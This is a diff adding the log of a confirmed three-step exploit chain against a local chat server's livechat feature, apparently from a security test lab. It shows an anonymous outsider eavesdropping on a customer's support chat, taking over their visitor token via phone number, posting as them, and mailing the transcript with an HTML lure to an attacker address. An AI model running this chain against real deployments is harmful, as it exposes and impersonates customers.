@@ -1,0 +1,21 @@
+========================================================================
+CHAIN-003: anonymous: eavesdrop on support chats -> become the customer -> mail out their conversation
+target : http://127.0.0.1:39649
+author : Blue Spider
+========================================================================
+[INFO] chaining VULN-076 (the Livechat stream authorizes the room the client names) -> VULN-001 (a phone number returns that customer's visitor token) -> VULN-051 (the transcript route mails the conversation to any address)
+[SETUP] Omnichannel turned on, which is the business feature this chain needs (was {'Livechat_enabled': False, 'Livechat_accept_chats_with_no_agents': False}); restored at the end
+[SETUP] customer conversation xGfgngaYKLbhYSSwd open (their browser token stays in their browser; their number on file is +1555235835)
+[SETUP] attacker opened its own conversation K4RB3B78RPCL9xf9X anonymously
+[STEP] 1/3 VULN-076: subscribe to the customer's room stream, naming our own room in extraData
+[PROOF]     the anonymous subscription to a stranger's conversation was accepted: {"msg": "ready", "subs": ["314c748c"]}
+[PROOF]     the customer's own messages arrived on the attacker's socket, including the number they gave the agent: harvested '+1555235835' from the live feed
+[STEP] 2/3 VULN-001: register +1555235835 under a fresh token of our own
+[PROOF]     HTTP 200: the response carries token='customer-834e8323' (the customer's own=True), visitor _id=6b059ae0e7422a44df31d787
+[PROOF]     with that token: the conversation history reads back (HTTP 200, contains the customer's own line=True) and a message posted as the customer returned HTTP 200
+[STEP] 3/3 VULN-051: mail the customer's transcript to collector-834e8323@lab.invalid, with an HTML lure planted as an upload description
+[PROOF]     upload HTTP 200, transcript HTTP 200: a mail from 'rocketchat@lab.invalid' arrived at the attacker's address carrying the customer's conversation (their own line present=True) and the attacker's live HTML link=True
+[INFO] cleanup: closing both conversations, clearing the attacker's mail and restoring the Omnichannel settings
+[INFO]     settings restored: {"Livechat_enabled": false, "Livechat_accept_chats_with_no_agents": false}
+[OK] CHAIN-003 CONFIRMED
+==> CHAIN-003 CONFIRMED 2026-11-24 - an anonymous outsider read a stranger's live support conversation, turned the phone number it saw there into that customer's visitor token, posted as them, and had the workspace mail their whole conversation to an attacker address from its own sender
